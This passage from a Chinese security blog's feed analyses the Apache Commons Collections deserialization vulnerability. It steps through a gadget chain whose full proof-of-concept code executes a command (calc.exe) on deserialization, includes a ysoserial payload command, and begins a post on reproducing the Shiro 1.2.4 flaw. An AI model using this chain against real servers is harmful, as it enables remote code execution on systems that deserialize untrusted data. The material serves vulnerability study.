class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        File f = new File(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        // 从文件payload.bin中读取数据</span><br><span class="line">        FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectInputStream fin = new ObjectInputStream(fi);</span><br><span class="line">        //服务端反序列化</span><br><span class="line">        String s = (String) fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/poc.png" alt></p><p>代码有点长，我们拆分成几个部分</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>该类有一个transformer函数，触发了反射机制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这个函数有个构造函数，会让我们传入三个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们可以创建一个InvokerTransformer对象，利用transform函数来执行命令，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Demo2 &#123;</span><br><span class="line">    public static void main(String[] args)  &#123;</span><br><span class="line"></span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new String[] &#123;&quot;calc.exe&quot;&#125;).transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>transform函数中传入我们的Runtime实例化对象，构造函数的参数传入我们要调用的函数，参数类型和参数。</p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/InvokerTransformer.png" alt></p><p>但是在开发的过程中应该不会让transform函数直接传入Runtime对象，所以我们需要想办法构造出Runtime.getRuntime()实例化对象。</p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>该类也有transform方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>将传入的对象原封不动的返回，估计这里是为了格式吧~</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>该类的transform很有趣：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = this.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>会将传入的对象作为下一个transform函数的参数，这里我们就可以实例化我们的Runtime对象了，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">public class Demo2 &#123;</span><br><span class="line">    public static void main(String[] args)  &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line">        transformedChain.transform(transformers);</span><br><span class="line">        //new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new String[] &#123;&quot;calc.exe&quot;&#125;).transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/ChainedTransformer.png" alt></p><p>我们可以构造一个transformerChain对象进行序列化，然后readObject进行反序列化，但是需要调用transform方法，除非开发这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">InputStream iii = request.getInputStream();</span><br><span class="line">ObjectInputStream in = new ObjectInputStream(iii);</span><br><span class="line">obj = in.readObject();</span><br><span class="line">obj.transform(Runtime.getRuntime());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure></p><p>很显然不会有人写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure></p><p>这个时候我们就要想办法找能够调用transform的类</p><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>Map类是存储键值对的数据结构，Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种变换，只要调用decorate()函数，传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap，decorate()函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">        return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>使用TransformedMap通过执行setValue方法会触发transform方法，打到我们先前想要的效果，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map.Entry elEntry = ( Map.Entry ) outerMap.entrySet().iterator().next();</span><br><span class="line">        elEntry.setValue(&quot;hahah&quot;);</span><br></pre></td></tr></table></figure></p><p>我们在setValue这里设置断点进行调试，来看看如何从setValues方法调用了transform方法的：<br><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/setValue.png" alt><br>跟进checkSetValue方法：<br><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/checkSetValue" alt><br>发现了我们熟悉的面孔</p><p>那么我们就从需要执行transform方法，转到了需要执行setValue方法</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>在jdk1.7当中有我们合适的类，会调用我们的setValue方法，并且重写了readObject方法。</p><p>构造函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;//var1满足这个if条件时</span><br><span class="line">        this.type = var1;//传入的var1到this.type</span><br><span class="line">        this.memberValues = var2;//我们的map传入this.memberValues</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>readobject复写函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        //默认反序列化</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();//</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();//遍历map迭代器</span><br><span class="line">            String var6 = (String)var5.getKey();//获取key的名称</span><br><span class="line">            Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();//获取map的value</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这里我们就看到了我们想要的setValue方法啦，想办法构造可以调用。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>这里就很简单，写一个反序列化的代码，然后我们反序列化的类容就是我们构造好的恶意对象。</p><p>攻击者端代码，将我们的恶意对象写入到payload.bin文件当中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        File f = new File(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们来查看这个二进制文件内容，用linux下的hexdump命令：<br><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/bin.png" alt></p><p>查看到里面有我们的恶意代码</p><p>服务器端代码（这里懒得找环境了，直接写个读取反序列化的就行），反序列化我们payload.bin文件中的对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class Demo2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        //从文件payload.bin中读取数据</span><br><span class="line">        FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectInputStream fin = new ObjectInputStream(fi);</span><br><span class="line">        //服务端反序列化</span><br><span class="line">        String s = (String) fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/fi.png" alt><br>成功弹窗。</p><p>当然我们也可以用ysoserial来输出我们的恶意对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &quot;calc.exe&quot; &gt; payload.bin</span><br></pre></td></tr></table></figure></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>其实之前有几个问题没想通的，但是后来跟着DEBUG以后就很清楚了，还是要多调试呀！</p><p>整体来说就是，readObject的时候我们的恶意对象由于重写了readObject方法，会调用我们构造好的恶意代码来进行攻击，对于最近流行的Shiro、CAS反序列化都是这样的。</p><p>比方说Shiro就是Cookie中的RememberMe传进去之后会进行反序列化，由于有AES加密，我们需要猜解密钥，然后将加密之后的序列化恶意对象发送过去，服务器端就会解密，进行反序列化。</p><p>说的很粗糙，也不晓得有没有错误呀。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a><br><a href="https://xz.aliyun.com/t/7031#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-9</a><br><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce" target="_blank" rel="noopener">https://blog.chaitin.cn/2015-11-11_java_unserialize_rce</a><br><a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实漏洞原理都看懂了，但是去看其他框架的反序列化漏洞还是有点迷糊，还是做下笔记叭！&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Apache Commons Collec
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>shiro 1.2.4反序列化漏洞分析</title>
    <link href="http://sherlocz.github.io/2020/08/02/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://sherlocz.github.io/2020/08/02/shiro-1-2-4反序列化漏洞分析/</id>
    <published>2020-08-02T09:36:45.000Z</published>
    <updated>2020-08-10T14:24:12.956Z</updated>
    
    <content type="html"><![CDATA[<p>官方issue:<br><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先下载有漏洞版本的shiro<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</span><br></pre></td></tr></table></figure></p><p>解压后进入<strong>simple/web</strong>目录，修改其中的<strong>pom.xml</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">            &lt;!--  这里需要将jstl设置为1.2 --&gt;</span><br><span class="line">            &lt;version&gt;1.2&lt;/version&gt; </span><br><span class="line">            &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">&lt;!--  加入我们的漏洞组件 --&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></table></figure></p><p>然后再<strong>pom.xml</strong>下运行 <strong>mvn install</strong> 命令进行打包，在target目录下会生成 <strong>samples-web-1.2.4.war</strong><br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/install.png" alt><br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/target.png" 